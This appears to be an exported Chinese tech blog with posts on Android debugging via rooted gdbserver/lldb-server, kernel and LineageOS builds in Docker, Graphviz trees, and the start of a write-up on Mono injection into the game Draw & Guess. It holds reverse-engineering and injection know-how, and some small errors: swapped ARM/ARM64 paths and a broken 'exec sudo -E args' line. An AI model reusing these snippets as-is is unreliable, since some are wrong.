    <content><![CDATA[<h2 id="执行以下语句即可"><a href="#执行以下语句即可" class="headerlink" title="执行以下语句即可"></a>执行以下语句即可</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite3 db.sqlite3 &quot;.dump&quot; &gt; new.sql</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>使用GDB、LLDB调试安卓程序</title>
    <url>/2022/05/06/debug-android-by-gdb-and-lldb/</url>
    <content><![CDATA[<h2 id="命令对照表"><a href="#命令对照表" class="headerlink" title="命令对照表"></a>命令对照表</h2><p><a href="https://lldb.llvm.org/use/map.html">GDB to LLDB command map</a></p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>PC: <code>Windows 10</code><br>NDK: <code>22.1.7171670</code></p>
<h3 id="程序位置"><a href="#程序位置" class="headerlink" title="程序位置"></a>程序位置</h3><p><code>GDB 8.3</code>（位于<code>&lt;ndk&gt;\toolchains\llvm\prebuilt\windows-x86_64\bin</code>）<br><code>lldb version 11.0.5</code>（位于<code>&lt;ndk&gt;\prebuilt\windows-x86_64\bin</code>）</p>
<p>注意：如果找不到NDK内置的对应server，则在Android Studio中下载旧版本。</p>
<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><h4 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h4><p><code>&lt;ndk&gt;\prebuilt\android-arm64\gdbserver</code><br><code>&lt;ndk&gt;\toolchains\llvm\prebuilt\windows-x86_64\lib64\clang\11.0.5\lib\linux\arm\lldb-server</code></p>
<h4 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h4><p><code>&lt;ndk&gt;\prebuilt\android-arm\gdbserver</code><br><code>&lt;ndk&gt;\toolchains\llvm\prebuilt\windows-x86_64\lib64\clang\11.0.5\lib\linux\aarch64\lldb-server</code></p>
<span id="more"></span>
<h2 id="Spawn模式"><a href="#Spawn模式" class="headerlink" title="Spawn模式"></a>Spawn模式</h2><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><h4 id="启动server"><a href="#启动server" class="headerlink" title="启动server"></a>启动server</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:9999 tcp:9999</span><br><span class="line">adb shell su -c &quot;/data/local/tmp/gdbserver :9999 /data/local/tmp/victim&quot;</span><br></pre></td></tr></table></figure>
<h4 id="PC连接"><a href="#PC连接" class="headerlink" title="PC连接"></a>PC连接</h4><p>进入<code>gdb</code>命令行，执行以下命令连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote :9999</span><br></pre></td></tr></table></figure>
<p>调试器自动断在<code>__dl__start () from target:/system/bin/linker</code></p>
<h3 id="lldb"><a href="#lldb" class="headerlink" title="lldb"></a>lldb</h3><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:1234 tcp:1234</span><br><span class="line">adb shell su -c &quot;/data/local/tmp/lldb-server platform --listen &#x27;*:1234&#x27; --server &amp;&quot;</span><br></pre></td></tr></table></figure>
<h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p>进入<code>lldb</code>命令行，执行以下命令连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">platform select remote-android</span><br><span class="line">platform connect connect://:1234</span><br></pre></td></tr></table></figure>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>设置工作目录，指定文件后执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">platform settings -w /data/local/tmp</span><br><span class="line">file victim</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h2 id="Attach模式"><a href="#Attach模式" class="headerlink" title="Attach模式"></a>Attach模式</h2><p>可使用<code>pidof</code>获取进程<code>pid</code></p>
<h3 id="gdb-1"><a href="#gdb-1" class="headerlink" title="gdb"></a>gdb</h3><h4 id="server-1"><a href="#server-1" class="headerlink" title="server"></a>server</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:9999 tcp:9999</span><br><span class="line">adb shell su -c &quot;/data/local/tmp/gdbserver :9999 --attach $(pidof victim)&quot;</span><br></pre></td></tr></table></figure>
<h4 id="PC连接-1"><a href="#PC连接-1" class="headerlink" title="PC连接"></a>PC连接</h4><p>进入<code>gdb</code>命令行，执行以下命令连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote :9999</span><br></pre></td></tr></table></figure>

<h3 id="lldb-1"><a href="#lldb-1" class="headerlink" title="lldb"></a>lldb</h3><h4 id="server-2"><a href="#server-2" class="headerlink" title="server"></a>server</h4><p>转发端口，并以后台模式启动：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:1234 tcp:1234</span><br><span class="line">adb shell su -c &quot;/data/local/tmp/lldb-server platform --listen &#x27;*:1234&#x27; --server &amp;&quot;</span><br></pre></td></tr></table></figure>
<h4 id="连接-1"><a href="#连接-1" class="headerlink" title="连接"></a>连接</h4><p>进入<code>lldb</code>命令行，执行以下命令连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">platform select remote-android</span><br><span class="line">platform connect connect://:1234</span><br></pre></td></tr></table></figure>
<h4 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h4><p>可使用进程名或<code>pid</code>附加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attach -name victim</span><br><span class="line">attach -p 18600</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lldb.llvm.org/use/remote.html">Remote Debugging — The LLDB Debugger</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>经验</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title>使用docker编译安卓内核源码</title>
    <url>/2021/09/13/docker-compile-android-kernel/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>PC：<code>Kali 2021.2</code><br>手机：<code>Nexus 5</code>、<code>Android 6.0.1</code><br>GCC：<code>4.8</code><br>内核版本：<code>3.4.0</code></p>
<span id="more"></span>
<h2 id="Docker相关"><a href="#Docker相关" class="headerlink" title="Docker相关"></a>Docker相关</h2><p>详见<a href="https://blog.xhyeax.com/2020/04/16/aosp-docker/">使用docker编译安卓源码</a></p>
<h2 id="下载内核源码"><a href="#下载内核源码" class="headerlink" title="下载内核源码"></a>下载内核源码</h2><h3 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm.git</span><br></pre></td></tr></table></figure>
<h3 id="查询分支"><a href="#查询分支" class="headerlink" title="查询分支"></a>查询分支</h3><p>手机设置-关于手机-内核版本，形如<code>3.4.0-g32ac281</code>，其中<code>short commit id</code>即为末尾七位字符<code>32ac281</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git branch -r --contains &lt;short commit id&gt;</span><br></pre></td></tr></table></figure>
<p>得到如下结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">origin/android-msm-hammerhead-3.4-marshmallow</span><br><span class="line">origin/android-msm-hammerhead-3.4-marshmallow-mr2</span><br><span class="line">origin/android-msm-hammerhead-3.4-marshmallow-mr3</span><br></pre></td></tr></table></figure>
<h3 id="检出分支"><a href="#检出分支" class="headerlink" title="检出分支"></a>检出分支</h3><p>注意：mr3版本有bug，无法查询Wifi，最后使用的是<code>android-msm-hammerhead-3.4-marshmallow</code>分支</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout -b android-msm-hammerhead-3.4-marshmallow origin/android-msm-hammerhead-3.4-marshmallow</span><br></pre></td></tr></table></figure>

<h2 id="使用root用户进入容器bash"><a href="#使用root用户进入容器bash" class="headerlink" title="使用root用户进入容器bash"></a>使用root用户进入容器bash</h2><p>直接使用<code>VSCode</code>的<code>Docker</code>插件附加，或执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cid=$(docker ps | grep aosp | cut -d&quot; &quot; -f1) &amp;&amp; echo $cid</span><br><span class="line">docker exec --privileged -u root -it $cid bash</span><br></pre></td></tr></table></figure>

<h2 id="配置GCC"><a href="#配置GCC" class="headerlink" title="配置GCC"></a>配置GCC</h2><h3 id="已有安卓源码：直接配置环境变量"><a href="#已有安卓源码：直接配置环境变量" class="headerlink" title="已有安卓源码：直接配置环境变量"></a>已有安卓源码：直接配置环境变量</h3><p>找到源码中gcc编译器位置，添加进PATH即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/aosp/android-6.0.0_r1/prebuilts/gcc/linux-x86/arm/arm-eabi-4.8/bin:$PATH</span><br></pre></td></tr></table></figure>
<h3 id="无安卓源码：手动下载后配置"><a href="#无安卓源码：手动下载后配置" class="headerlink" title="无安卓源码：手动下载后配置"></a>无安卓源码：手动下载后配置</h3><p>下载gcc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.8</span><br></pre></td></tr></table></figure>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/aosp/arm-eabi-4.8/bin:$PATH</span><br></pre></td></tr></table></figure>

<h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>切换到内核目录，执行以下命令即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export ARCH=arm</span><br><span class="line">export SUBARCH=arm</span><br><span class="line">export CROSS_COMPILE=arm-eabi-</span><br><span class="line">make hammerhead_defconfig</span><br><span class="line">cpus=$(grep ^processor /proc/cpuinfo | wc -l)</span><br><span class="line">make -j$[2*$cpus]</span><br></pre></td></tr></table></figure>

<h2 id="使用其他编译器"><a href="#使用其他编译器" class="headerlink" title="使用其他编译器"></a>使用其他编译器</h2><p>暂时没有使用高版本编译器编译内核的需要，待测试…</p>
<h3 id="使用GCC4-9（未测试）"><a href="#使用GCC4-9（未测试）" class="headerlink" title="使用GCC4.9（未测试）"></a>使用GCC4.9（未测试）</h3><p>同理，添加到<code>PATH</code>后编译即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export ARCH=arm</span><br><span class="line">export SUBARCH=arm</span><br><span class="line">export CROSS_COMPILE=arm-linux-androideabi-</span><br><span class="line">make hammerhead_defconfig</span><br><span class="line">cpus=$(grep ^processor /proc/cpuinfo | wc -l)</span><br><span class="line">make -j$[2*$cpus]</span><br></pre></td></tr></table></figure>
<h3 id="使用Clang（未测试）"><a href="#使用Clang（未测试）" class="headerlink" title="使用Clang（未测试）"></a>使用Clang（未测试）</h3><blockquote>
<p>Android’s GCC 4.9 has been deprecated in favor of Clang, and will be removed from Android in January 2020 as per the below timeline.</p>
</blockquote>
<p>安卓的GCC 4.9已被弃用，使用Clang替换</p>
<h2 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h2><h3 id="已有安卓源码：直接编译生成"><a href="#已有安卓源码：直接编译生成" class="headerlink" title="已有安卓源码：直接编译生成"></a>已有安卓源码：直接编译生成</h3><p>打开源码目录，执行以下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source ./build/envsetup.sh</span><br><span class="line">lunch aosp_hammerhead-userdebug</span><br></pre></td></tr></table></figure>
<p>然后设置内核文件位置（默认使用<code>/aosp/android-6.0.0_r1/device/lge/zImage-dtb</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export TARGET_PREBUILT_KERNEL=/aosp/kernel/msm/arch/arm/boot/zImage-dtb</span><br></pre></td></tr></table></figure>
<p>之后打包即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cpus=$(grep ^processor /proc/cpuinfo | wc -l)</span><br><span class="line">make -j$[2*$cpus]</span><br></pre></td></tr></table></figure>
<p>生成的镜像位于<code>out/target/produuct/hammerhead/boot.img</code></p>
<h3 id="无安卓源码：手动重打包"><a href="#无安卓源码：手动重打包" class="headerlink" title="无安卓源码：手动重打包"></a>无安卓源码：手动重打包</h3><p>使用<code>mkbootimg</code>和<code>unmkbootimg</code>重打包镜像</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="https://blog.xhyeax.com/2019/09/13/android-source-mod-anti-antidebug/">修改安卓内核源码 过State TracerPid wchan反调试</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.52pojie.cn/thread-940605-1-1.html">Android反调试——从源码入手</a><br><a href="https://bbs.pediy.com/thread-254443.htm">nexus5重新编译手机内核，手机WiFi无法正常使用</a><br><a href="https://blog.csdn.net/weixin_42268494/article/details/111907114">android dtb文件位置_android 内核源码编译到刷机</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Kernel</tag>
        <tag>Linux</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>构建自己的Docker镜像（用于编译Lineage 18.1）</title>
    <url>/2021/10/04/docker-lineage-18.1/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><a href="https://github.com.cnpmjs.org/lineageos4microg/docker-lineage-cicd">docker-lineage-cicd</a>启动后会自动同步代码并编译，需要指定的参数也比较多，于是考虑制作自己的<code>Docker</code>镜像，用于编译<code>Lineage 18.1</code>。</p>
<p>项目见<a href="https://github.com/XhyEax/docker-lineage">docker-lineage</a></p>
<span id="more"></span>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><p>参考<a href="https://github.com/lineageos4microg/docker-lineage-cicd/blob/master/Dockerfile">docker-lineage-cicd/Dockerfile</a><br>仅保留<code>source</code>和<code>ccache</code>两个目录映射，精简不必要的依赖，替换<code>cron</code>为<code>vim</code>，使用<code>TUNA</code>的<code>repo</code>，最后执行<code>entrypoint</code>设置的脚本</p>
<h3 id="docker-entrypoint-sh"><a href="#docker-entrypoint-sh" class="headerlink" title="docker_entrypoint.sh"></a>docker_entrypoint.sh</h3><p>设置<code>ccache</code>大小和<code>git</code>帐号，最后进入<code>bash</code></p>
<h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build --network=host \</span><br><span class="line">-t xhyeax/docker-lineage:v18.1 .</span><br></pre></td></tr></table></figure>
<p>为使用本地的http代理安装依赖，网络选择<code>host</code>模式</p>
<h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export ANDROID_VOL=/media/xhy/a5d37cc9-d3a3-43c8-909d-178d70a6598c/Android</span><br><span class="line">docker run --privileged -it \</span><br><span class="line">-v &quot;$ANDROID_VOL/source:/srv/src&quot; \</span><br><span class="line">-v &quot;$ANDROID_VOL/ccache:/srv/ccache&quot; \</span><br><span class="line">xhyeax/docker-lineage:v18.1</span><br></pre></td></tr></table></figure>
<h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>可以使用<code>VSCode</code>的<code>Docker</code>插件，将镜像上传到<code>Docker Hub</code></p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="build-卡在-tzdata-Geographic-area"><a href="#build-卡在-tzdata-Geographic-area" class="headerlink" title="build 卡在 tzdata Geographic area:"></a>build 卡在 tzdata Geographic area:</h3><p>在<code>Dockerfile</code>中设置环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENV DEBIAN_FRONTEND=noninteractive</span><br></pre></td></tr></table></figure>
<h3 id="docker-entrypoint-sh-Permission-denied"><a href="#docker-entrypoint-sh-Permission-denied" class="headerlink" title="docker_entrypoint.sh Permission denied"></a>docker_entrypoint.sh Permission denied</h3><p>给脚本增加可执行权限，重新<code>build</code></p>
<h3 id="编译时permission-denied"><a href="#编译时permission-denied" class="headerlink" title="编译时permission denied"></a>编译时permission denied</h3><p>启动容器时增加<code>--privileged</code></p>
<h3 id="docker-entrypoint-sh执行后退出"><a href="#docker-entrypoint-sh执行后退出" class="headerlink" title="docker_entrypoint.sh执行后退出"></a>docker_entrypoint.sh执行后退出</h3><p>原因：未运行前台应用，容器自动关闭<br>可增加<code>-d</code>参数启动容器<br>或在<code>docker_entrypoint.sh</code>脚本末尾增加进入<code>Shell</code>的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">args=&quot;$@&quot;</span><br><span class="line">if [ -z &quot;$args&quot; ]; then</span><br><span class="line">  args=&quot;bash&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec sudo -E args</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://techoverflow.net/2019/05/18/how-to-fix-configuring-tzdata-interactive-input-when-building-docker-images/">How to fix ‘Configuring tzdata’ interactive input when building Docker images</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Graphviz画一颗二叉树</title>
    <url>/2020/04/13/draw-bintree-by-graphviz/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>发现有一个工具叫<code>Graphviz</code>，类似于<code>markdown</code>，它使用dot标记语言来编写，能将其转换为图形。</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>（非必需，文末有精简版下载地址）<br>下载并安装<a href="https://graphviz.gitlab.io/download/">Graphviz</a><br>将<code>安装目录/bin</code>添加到环境变量</p>
<span id="more"></span>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digraph binTree&#123;</span><br><span class="line">    node[shape=circle,fontsize=30,color=blue];</span><br><span class="line">    root-&gt;a[side=left];</span><br><span class="line">    root-&gt;b[side=right];</span><br><span class="line">    a-&gt;c[side=left];</span><br><span class="line">    a-&gt;d[side=right];</span><br><span class="line">    b-&gt;e[side=left];</span><br><span class="line">    e-&gt;f[side=right];</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>直接使用<code>dot -Tpng -o tree.png tree.dot</code>转换，结果为：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/draw-bintree-by-graphviz-1.png"><br>左右节点不明显。</p>
<h3 id="使用优化模板转换"><a href="#使用优化模板转换" class="headerlink" title="使用优化模板转换"></a>使用优化模板转换</h3><p><code>binarytree.gvpr</code>内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// from Emden Gansner</span><br><span class="line">// https://mailman.research.att.com/pipermail/graphviz-interest/2010q2/007101.html</span><br><span class="line">// requires GraphViz 2.28.0 (fails with 2.26.3 at least)</span><br><span class="line">BEGIN &#123;</span><br><span class="line">  double tw[node_t];    // width of tree rooted at node</span><br><span class="line">  double nw[node_t];    // width of node</span><br><span class="line">  double xoff[node_t];  // x offset of root from left side of its tree</span><br><span class="line">  double sp = 36;       // extra space between left and right subtrees</span><br><span class="line">  double wd, w, w1, w2;</span><br><span class="line">  double x, y, z;</span><br><span class="line">  edge_t e1, e2;</span><br><span class="line">  node_t n;</span><br><span class="line">&#125;</span><br><span class="line">BEG_G &#123;</span><br><span class="line">  $.bb = &quot;&quot;;</span><br><span class="line">  $tvtype=TV_postfwd;   // visit root after all children visited</span><br><span class="line">&#125;</span><br><span class="line">N &#123;</span><br><span class="line">  sscanf ($.width, &quot;%f&quot;, &amp;w);</span><br><span class="line">  w *= 72;  // convert inches to points</span><br><span class="line">  nw[$] = w;</span><br><span class="line">  if ($.outdegree == 0) &#123;</span><br><span class="line">    tw[$] = w;</span><br><span class="line">    xoff[$] = w/2.0;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ($.outdegree == 1) &#123;</span><br><span class="line">    e1 = fstout($);</span><br><span class="line">    w1 = tw[e1.head];</span><br><span class="line">    tw[$] = w1 + (sp+w)/2.0;</span><br><span class="line">    if (e1.side == &quot;left&quot;)</span><br><span class="line">      xoff[$] = tw[$] - w/2.0;</span><br><span class="line">    else</span><br><span class="line">      xoff[$] = w/2.0;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    e1 = fstout($);</span><br><span class="line">    w1 = tw[e1.head];</span><br><span class="line">    e2 = nxtout(e1);</span><br><span class="line">    w2 = tw[e2.head];</span><br><span class="line">    wd = w1 + w2 + sp;</span><br><span class="line">    if (w &gt; wd)</span><br><span class="line">      wd = w;</span><br><span class="line">    tw[$] = wd;</span><br><span class="line">    xoff[$] = w1 + sp/2.0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">BEG_G &#123;</span><br><span class="line">  $tvtype=TV_fwd;   // visit root first, then children</span><br><span class="line">&#125;</span><br><span class="line">N &#123;</span><br><span class="line">  if ($.indegree == 0) &#123;</span><br><span class="line">    sscanf ($.pos, &quot;%f,%f&quot;, &amp;x, &amp;y);</span><br><span class="line">    $.pos = sprintf(&quot;0,%f&quot;, y);</span><br><span class="line">  &#125;</span><br><span class="line">  if ($.outdegree == 0) return;</span><br><span class="line">  sscanf ($.pos, &quot;%f,%f&quot;, &amp;x, &amp;y);</span><br><span class="line">  wd = tw[$];</span><br><span class="line">  e1 = fstout($);</span><br><span class="line">  n = e1.head;</span><br><span class="line">  sscanf (n.pos, &quot;%f,%f&quot;, &amp;z, &amp;y);</span><br><span class="line">  if ($.outdegree == 1) &#123;</span><br><span class="line">    if (e1.side == &quot;left&quot;)</span><br><span class="line">      n.pos = sprintf(&quot;%f,%f&quot;,  x - tw[n] - sp/2.0 + xoff[n], y);</span><br><span class="line">    else</span><br><span class="line">      n.pos = sprintf(&quot;%f,%f&quot;, x + sp/2.0 + xoff[n], y);</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    n.pos = sprintf(&quot;%f,%f&quot;, x - tw[n] - sp/2.0 + xoff[n], y);</span><br><span class="line">    e2 = nxtout(e1);</span><br><span class="line">    n = e2.head;</span><br><span class="line">    sscanf (n.pos, &quot;%f,%f&quot;, &amp;z, &amp;y);</span><br><span class="line">    n.pos = sprintf(&quot;%f,%f&quot;, x + sp/2.0 + xoff[n], y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>保存到文件后，执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dot tree.dot | gvpr -c -f binarytree.gvpr | neato -n -Tpng -o tree.png</span><br></pre></td></tr></table></figure>
<p>转换结果为：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/draw-bintree-by-graphviz-2.png"></p>
<h2 id="精简版打包下载地址"><a href="#精简版打包下载地址" class="headerlink" title="精简版打包下载地址"></a>精简版打包下载地址</h2><p>链接: <a href="https://pan.baidu.com/s/1DV4PVU09lt-RHeqoD1-qRA">https://pan.baidu.com/s/1DV4PVU09lt-RHeqoD1-qRA</a> 提取码: 2333</p>
<p>包含执行以上命令所需的必要文件（体积由47M缩减为10M不到），以及本文中的例子<br>解压后，执行<code>convert.bat</code>即可将<code>tree.dot</code>转化为图片<br>PS：如果需要使用其他功能，请下载完整版</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.yanbinghu.com/2019/04/10/9448.html">如何画一棵漂亮的二叉树</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Mono注入 保存你画我猜历史房间数据</title>
    <url>/2021/08/01/draw-and-guess-save-history/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>最近在Steam购买了你画我猜(<code>Draw &amp; Guess</code>)，游戏并不支持保存最近房间代码，以及玩家id。<br>由于众所周知的服务器原因（土豆做的），经常有人掉线或闪退（也可能是自己），重连后无法返回之前的房间。</p>
<p>于是考虑使用Mono注入技术，实现历史房间数据的保存。</p>
<span id="more"></span>
<h2 id="逆向分析过程"><a href="#逆向分析过程" class="headerlink" title="逆向分析过程"></a>逆向分析过程</h2><h3 id="文件结构分析"><a href="#文件结构分析" class="headerlink" title="文件结构分析"></a>文件结构分析</h3><p>查看游戏目录结构，发现是使用Unity编写的Mono平台游戏，关键dll文件位于<code>..\steamapps\common\Draw &amp; Guess\Draw&amp;Guess_Data\Managed</code>，并且未加密。</p>
<h3 id="房间代码生成"><a href="#房间代码生成" class="headerlink" title="房间代码生成"></a>房间代码生成</h3><p>搜索<code>RoomCode</code>，定位到类<code>RoomCodeEncoder</code>，发现房间代码是由房主的<code>SteamID</code>进行<code>base36</code>编码生成，对应<code>DecimalToArbitrarySystem</code>函数。</p>
<p><code>ArbitraryToDecimalSystem</code>函数用于将房间代码转换为<code>SteamID</code>，在<code>MenuClicks.EnterRoomCode</code>函数中被调用，通过<code>LobbyManager</code>的<code>Join</code>函数加入指定玩家的房间（如下图）</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-1.png"></p>
<p>因此，只需记录玩家id，即可计算出房间代码。</p>
<p>PS：可通过<code>http://steamcommunity.com/profiles/</code>+steamID，打开个人主页</p>
<h3 id="记录玩家id"><a href="#记录玩家id" class="headerlink" title="记录玩家id"></a>记录玩家id</h3><p>搜索<code>PlayerList</code>，找到<code>LobbyPlayerList</code>和<code>IngamePlayerList</code>，分别对应<code>匹配时玩家列表</code>和<code>游戏时玩家列表</code>。</p>
<h4 id="匹配时玩家列表"><a href="#匹配时玩家列表" class="headerlink" title="匹配时玩家列表"></a>匹配时玩家列表</h4><h5 id="类结构："><a href="#类结构：" class="headerlink" title="类结构："></a>类结构：</h5><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LobbyPlayerList Instance;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">List</span>&lt;<span class="title">RectTransform</span>&gt; PlayerList</span> = <span class="keyword">new</span> List&lt;RectTransform&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">List</span>&lt;<span class="title">LobbyPlayerInfo</span>&gt; Players</span> = <span class="keyword">new</span> List&lt;LobbyPlayerInfo&gt;();</span><br></pre></td></tr></table></figure>
<h5 id="AddPlayer-函数："><a href="#AddPlayer-函数：" class="headerlink" title="AddPlayer 函数："></a>AddPlayer 函数：</h5><p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-2.png"></p>
<p>可通过<code>LobbyPlayerList.Instance.Players</code>直接获取到玩家列表。</p>
<h4 id="游戏时玩家列表"><a href="#游戏时玩家列表" class="headerlink" title="游戏时玩家列表"></a>游戏时玩家列表</h4><h5 id="类结构：-1"><a href="#类结构：-1" class="headerlink" title="类结构："></a>类结构：</h5><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Dictionary</span>&lt;<span class="title">ulong</span>, <span class="title">IngamePlayerListEntry</span>&gt; ContainedPlayers</span> = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">ulong</span>, IngamePlayerListEntry&gt;();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> IngamePlayerList CurrentList;</span><br></pre></td></tr></table></figure>
<h5 id="AddPlayer-函数：-1"><a href="#AddPlayer-函数：-1" class="headerlink" title="AddPlayer 函数："></a>AddPlayer 函数：</h5><p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-3.png"></p>
<p>可使用<code>IngamePlayerList.CurrentList</code>的<code>ContainedPlayers</code>字段获取玩家列表，由于修饰符为<code>private</code>（非<code>public</code>），需要通过反射获取。</p>
<h4 id="确定获取时机"><a href="#确定获取时机" class="headerlink" title="确定获取时机"></a>确定获取时机</h4><p>查看<code>AddPlayer</code>调用栈：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-4.png"><br>由此可确定以下两个函数：<br><code>RoundManager.UserCode_RpcSetInfo</code>（对应<code>LobbyPlayerList</code>）<br><code>LobbyPlayerInfo.UserCode_RpcSetPlayerInfo</code>（对应<code>IngamePlayerList</code>）</p>
<p>注意到后者传入的是数组，推测该函数是每次按下<code>Tab</code>，显示玩家列表时调用，需要手动按键才能触发。</p>
<p>考虑到两者先后顺序（<code>LobbyPlayerList</code>先于<code>IngamePlayerList</code>），故选择使用<code>LobbyPlayerList.Instance.Players</code>获取玩家列表。</p>
<h4 id="确定Hook函数"><a href="#确定Hook函数" class="headerlink" title="确定Hook函数"></a>确定Hook函数</h4><p>搜索字符串<code>游戏将在</code>，定位到<code>SimplifiedChineseLocalisation.UIGameStartingIn</code>变量，查看其调用栈：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/dag-history-5.png"></p>
